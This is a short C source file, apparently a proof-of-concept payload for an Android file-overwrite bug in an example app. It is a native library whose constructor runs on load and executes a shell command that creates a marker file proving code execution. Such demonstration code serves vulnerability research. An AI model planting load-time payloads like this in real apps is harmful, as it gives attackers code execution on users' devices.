#include <jni.h>
#include <stdlib.h>
#include <unistd.h>

// This special function is a "constructor". It will automatically run
// the moment the library is loaded into memory by the vulnerable app.
void __attribute__ ((constructor)) run_payload() {
    // For this Proof of Concept, our "malicious" code will just create a file
    // on the public storage to prove that our code was executed.
    system("touch /storage/emulated/0/Android/data/com.example.dirtystream/files/RCE_SUCCESSFUL.txt");
}
